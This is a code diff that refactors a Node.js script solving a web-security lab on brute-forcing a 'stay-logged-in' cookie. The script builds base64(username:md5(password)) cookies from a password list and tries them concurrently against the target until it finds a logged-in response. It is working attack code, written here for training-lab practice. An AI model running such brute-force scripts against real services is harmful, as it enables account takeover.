@@ -2,6 +2,7 @@ import md5 from "md5";
 import { getParsedInput } from "../../../utils/getParsedInput.js";
 import { runTasks } from "../../../utils/runTasks.js";
 import { getPasswords } from "../../../utils/config.js";
+import { victimsAccount } from "../../../../config/accounts.js";
 
 const { url, concurrencyLimit, httpClient } = getParsedInput({
   description: "Lab: Brute-forcing a stay-logged-in cookie",
@@ -12,19 +13,16 @@ const { url, concurrencyLimit, httpClient } = getParsedInput({
 const passwords = await getPasswords();
 
 async function task(password) {
-  const hash = md5(password);
-  const payload = Buffer.from(`carlos:${hash}`).toString("base64");
-  const cookie = "stay-logged-in=" + payload;
   const resp = await httpClient.get(url, {
     headers: {
-      cookie: cookie,
+      cookie: getCookie(password),
     },
   });
 
-  if (resp.data.includes("my-account?id=carlos")) {
+  if (isLoggedIn(resp.data)) {
     console.log(`${password}: success`);
     console.log(
-      `Login with username "carlos" and password "${password}" to solve the lab`,
+      `Login with username "${victimsAccount.username}" and password "${password}" to solve the lab`,
     );
     process.exit(0);
   } else {
@@ -32,10 +30,17 @@ async function task(password) {
   }
 }
 
-// TODO extract this into a function
-const tasks = [];
-for (const password of passwords) {
-  tasks.push(() => task(password));
+function getCookie(password) {
+  const hash = md5(password);
+  const value = Buffer.from(`${victimsAccount.username}:${hash}`).toString(
+    "base64",
+  );
+  return "stay-logged-in=" + value;
 }
 
-await runTasks(tasks, concurrencyLimit);
+function isLoggedIn(html) {
+  return html.includes(`my-account?id=${victimsAccount.username}`);
+}
+
+const tasks = passwords.map((password) => () => task(password));
+runTasks(tasks, concurrencyLimit);
